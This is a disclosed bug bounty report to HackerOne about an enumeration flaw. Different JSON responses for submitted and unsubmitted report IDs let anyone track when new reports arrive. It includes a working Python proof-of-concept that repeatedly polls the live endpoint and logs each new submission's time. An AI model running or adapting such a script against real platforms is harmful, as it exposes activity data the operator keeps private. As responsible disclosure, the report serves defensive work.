# Ability to monitor reports' submission in real time

## Report Details
- **Report ID**: 159890
- **URL**: https://hackerone.com/reports/159890
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-17T00:59:11.910Z
- **Disclosed**: 2016-08-17T08:02:00.458Z

## Reporter
- **Username**: saeedhashem
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Hey ,

I would like to report an issue with the server responses that allow anyone users to monitor and track the reports' submission and the platform activity .

##Description :

The issue occurs on the endpoint '/reports/[report_id].json' due to the difference between server responses for submitted reports and  the yet not submitted ones .

If the report is already submitted and the logged in user has no access to it the html response will return a message saying `Oops! You can't access this report because it isn't public yet.` and the JSON response will return a blank page , zero length .

And if the report id passed to the endpoint hasn't been submitted yet , the HTML response will return a not found page , and the JSON response will return `{"status":"404","error":"Not Found"}` .

##PoC :

I wrote a simple python script can exploit this behaviour , it's my first pentesting python script by the way , sorry for the poor coding , I just learned how to do this today but you'll get the idea  :

```
import requests
import time
from datetime import datetime

start = raw_input("\nEnter the last report you know about [Ignore if before #159875]: ")
if start == '' :
    start = 159874
else :
    start = int(start)

if start < 159874 :
    start = 159874

def getReport(report):
    url = 'https://hackerone.com/reports/%s.json' % str(report)
    res = requests.get(url)
    l = len(res.text)
    if l == 36 :
        return 0 
    else:
        return 1 

def lastReport(start):
    for report in range( start ,1000000):
        if getReport(report):
            continue
        else :
            report = report - 1
            return report

last = lastReport(start)
print "\n[+]Last submitted report is : #%s\n" % str(last)

def getNext(last):
    report = last + 1
    if getReport(report):
        now = datetime.now()
        print "Report number #%s has been submited at %s/%s/%s %s:%s\n" % (report , now.month, now.day, now.year, now.hour, now.minute)
        last = report
        getNext(last)
    else :
        time.sleep(30)
        last = report - 1
        getNext(last)

getNext(last)
```
As the markdown missed up the code a bit I'm attaching it in two files 
F112672 => works well on Windows
F112671 => works well on Linux

The output of the script would be like :

{F112668}
{F112670}

Basically it records the date and time of every newly submitted report , of course that can be improved to generate hourly or daily reports about the platform activities , when hackers are mostly active , how frequent reports are submitted on H1 and so on , all is normally undisclosed information , only platform operator should know about .

##Impact :

I think it's too permissive for a highly secure platform to leave a way open for third parties to track its activity and its user interactions with the platform , which considered as privilege information only platform operators should be allowed to get their hands onto .

Thank you guys , glad that I've learned something new today specifically for this report , hope it qualifies and worth addressing . 

Best regards ,
Thanks ,

## Attachments
- H1-mon1.PNG
- H1-mon2.PNG
- h1-py3.py
- h1-py2.py
